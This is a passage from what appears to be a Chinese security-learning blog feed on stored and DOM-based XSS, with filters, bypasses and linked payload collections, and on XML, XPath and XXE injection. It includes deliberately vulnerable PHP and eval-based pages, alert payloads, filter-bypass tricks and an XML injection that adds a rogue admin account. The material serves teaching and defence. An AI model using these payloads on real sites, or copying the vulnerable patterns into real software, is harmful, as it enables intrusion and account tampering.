  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('添加成功！')&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT username, message FROM xss;"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div> Name:"</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">" Message:"</span> <span class="token operator">.</span> <span class="token variable">$message</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/div>&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h2><p>前端是一个表单，用于将数据提交到后端</p>
<img src="/2022/02/28/xss/image-20220329110557564.png" class="" loading="lazy">

<p>后端用于接收数据，并将数据展示给用户</p>
<img src="/2022/02/28/xss/image-20220329112254116.png" class="" title="image-20220329112254116" loading="lazy">

<p>注入JS代码：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，成功弹窗</p>
<img src="/2022/02/28/xss/image-20220329112427410.png" class="" title="image-20220329112427410" loading="lazy">

<p>查看数据库，成功插入数据</p>
<img src="/2022/02/28/xss/image-20220329112601197.png" class="" title="image-20220329112601197" loading="lazy">

<p>每次进入页面都会执行代码</p>
<img src="/2022/02/28/xss/image-20220329112806677.png" class="" title="image-20220329112806677" loading="lazy">

<h1 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h1><h2 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h2><ul>
<li>全程在前端执行，不经过后端；</li>
<li>主要存在于能修改页面的dom。</li>
</ul>
<h2 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>无交互，全程在前端执行</p>
<h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>DOM型XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> pos <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"name="</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token function">eval</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> document<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>This is a xss test ...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<h2 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h2><p>一个简单的页面</p>
<img src="/2022/02/28/xss/image-20220329114158482.png" class="" title="image-20220329114158482" loading="lazy">

<p>传入参数后会被执行</p>
<img src="/2022/02/28/xss/image-20220329114245391.png" class="" title="image-20220329114245391" loading="lazy">

<h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>总体思路是对用户的输入进行<strong>过滤</strong>，对输出进行<strong>编码</strong>，<strong>阻止恶意操作的执行</strong>。</p>
<p>不管是哪种类型的XSS，都可以在服务端进行过滤。</p>
<h2 id="黑（白）名单"><a href="#黑（白）名单" class="headerlink" title="黑（白）名单"></a>黑（白）名单</h2><ul>
<li>黑名单：过滤特殊符号及字符</li>
<li>白名单：限制类型或符号</li>
</ul>
<h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>在setcookie中将httponly选项设置为true</p>
<h2 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h2><ol>
<li><p>功能：替换字符串，区分大小写</p>
</li>
<li><p>用法：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;script>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li>
</ol>
<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><ol>
<li><p>功能：对目标字符串进行一次正则替换，i模式下不区分大小写</p>
</li>
<li><p>用法：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t(.*)>/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li>
</ol>
<h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h2><ol>
<li><p>功能：把预定义的字符转换为HTML实体，防止被浏览器当做HTML元素</p>
</li>
<li><p>用法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li>
</ol>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="lt-gt"><a href="#lt-gt" class="headerlink" title="&lt;&gt;"></a>&lt;&gt;</h2><p>当<code>&lt;</code>、<code>&gt;</code>被过滤时，可以利用标签自带的事件绕过</p>
<ul>
<li>输入框：onfocus、onclick</li>
<li>svg：onload</li>
</ul>
<h2 id="script"><a href="#script" class="headerlink" title="script"></a>script</h2><p>利用img标签的onerror属性执行JS</p>
<pre class="language-none"><code class="language-none">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&quot;alert(1)&quot;&#x2F;&gt;</code></pre>

<img src="/2022/02/28/xss/image-20220328213158751.png" class="" title="image-20220328213158751" loading="lazy">

<h1 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h1><p><a href="https://github.com/pgaijin66/XSS-Payloads">XSS载荷大全</a></p>
<p><a href="https://xss.pt/">XSS平台</a></p>
<p><a href="https://github.com/do0dl3/xss-labs">xss-labs</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XML+XXE</title>
    <url>/2021/08/05/XML%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><ul>
<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>
<li>XML 是一种_标记语言_，很类似 HTML</li>
<li>XML 的设计宗旨是_传输数据_，而非显示数据</li>
<li>XML 标签没有被预定义。您需要_自行定义标签_。</li>
<li>XML 被设计为具有_自我描述性_。</li>
<li>XML 是 <em>W3C 的推荐标准</em></li>
</ul>
<h2 id="XML与HTML"><a href="#XML与HTML" class="headerlink" title="XML与HTML"></a>XML与HTML</h2><ul>
<li>XML是用来传输和存储数据的</li>
<li>HTML是用来显示数据的</li>
<li>XML不是HTML的替代，说是一种补充更合适</li>
</ul>
<h2 id="为什么需要XML"><a href="#为什么需要XML" class="headerlink" title="为什么需要XML"></a>为什么需要XML</h2><p>如果你需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p>
<p>通过 XML，数据能够存储在独立的 XML 文件中。这样你就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p>
<p>通过使用几行 JavaScript，你就可以读取一个外部 XML 文件，然后更新 HTML 中的数据内容。</p>
<h2 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h2><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?></span><span class="token comment">&lt;!--xml文件的声明--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span>                                                 <span class="token comment">&lt;!--根元素--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!--bookstore的子元素，category为属性--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>           <span class="token comment">&lt;!--book的子元素，lang为属性--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>                  <span class="token comment">&lt;!--book的子元素--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span>                                     <span class="token comment">&lt;!--book的子元素--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span>                                  <span class="token comment">&lt;!--book的子元素--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span>                                                 <span class="token comment">&lt;!--book的结束--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span>                                       <span class="token comment">&lt;!--bookstore的结束--></span></code></pre>

<ul>
<li><p>所有 XML 元素都须有关闭标签</p>
</li>
<li><p>XML 标签对大小写敏感</p>
</li>
<li><p>XML 必须正确地嵌套</p>
</li>
<li><p>XML 文档必须有根元素</p>
</li>
<li><p>XML 的属性值须加引号</p>
</li>
</ul>
<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。</p>
<p>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。</p>
<p>DTD是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p>
<h2 id="引入方式"><a href="#引入方式" class="headerlink" title="引入方式"></a>引入方式</h2><h3 id="内部DTD"><a href="#内部DTD" class="headerlink" title="内部DTD"></a>内部DTD</h3><p>使用内部的dtd文件，即将约束规则定义在xml文档中</p>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
]&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;&#x2F;to&gt;
&lt;from&gt;@re&lt;&#x2F;from&gt;
&lt;head&gt;v3ry&lt;&#x2F;head&gt;
&lt;body&gt;g00d!&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt;</code></pre>

<h3 id="外部DTD"><a href="#外部DTD" class="headerlink" title="外部DTD"></a>外部DTD</h3><ul>
<li>引入外部的dtd文件</li>
</ul>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre>

<p>使用网络上的dtd文件</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>

<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA指的是被解析的字符数据</p>
<h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>所有的XML文档中文本均会被解析器解析，只有CDATA区段的文本会被解析器忽略</p>
<h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>声明一个元素</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ELEMENT 元素名称 类别&gt;</code></pre>

<p>或者</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ELEMENT 元素名称 (元素内容)&gt;</code></pre>

<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>声明元素的属性</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre>

<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><ul>
<li><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
</li>
<li><p>实体引用是对实体的引用。</p>
</li>
<li><p>实体可在内部或外部进行声明。</p>
</li>
</ul>
<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><ul>
<li>语法</li>
</ul>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>

<ul>
<li>DTD例子</li>
</ul>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;
&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</code></pre>

<ul>
<li>XML例子</li>
</ul>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</code></pre>

<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
<ul>
<li>语法</li>
</ul>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;
或者
&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>

<ul>
<li>DTD例子</li>
</ul>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;
&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</code></pre>

<ul>
<li>XML例子</li>
</ul>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</code></pre>

<h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><p>XML是一种数据组织存储的数据结构方式</p>
<blockquote>
<p>安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p>
</blockquote>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ol>
<li>用户能够控制数据的输入</li>
<li>程序有拼凑的数据</li>
</ol>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>test1.xml</li>
</ul>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manager</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>
    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>
    
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manager</span><span class="token punctuation">></span></span></code></pre>

<p>对于上面的xml文件，如果攻击者能够掌控password字段，那么就会产生XML注入。如攻击者输入：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">admin <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span></code></pre>

<p>最终修改结果为：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manager</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>
    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>
    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span>
    
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manager</span><span class="token punctuation">></span></span></code></pre>

<p>XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p>
<h2 id="XML注入防御"><a href="#XML注入防御" class="headerlink" title="XML注入防御"></a>XML注入防御</h2><ol>
<li>对用户的输入进行过滤</li>
<li>对用户的输入进行转义</li>
</ol>
<h1 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a>XPATH注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XPath注入攻击是指利用XPath 解析器的<strong>松散输入</strong>和<strong>容错特性</strong>，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。</p>
<p>XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>XPath注入攻击利用两种技术，即<strong>XPath扫描</strong>和 <strong>XPath查询布尔化</strong>。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>XPath注入攻击主要是通过构建特殊的<strong>输入</strong>，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。</p>
<p>注入对象不是数据库users表，而是一个存储数据的<strong>XML文件</strong>。</p>
<p>因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> ，<code>parameters/input</code>等。</p>
<p><a href="https://www.w3school.com.cn/xpath/xpath_syntax.asp">Xpath语法</a></p>
<p>如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。</p>
<p>Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。</p>
<h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>test2.xml</li>
</ul>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>test1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>test1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span> 
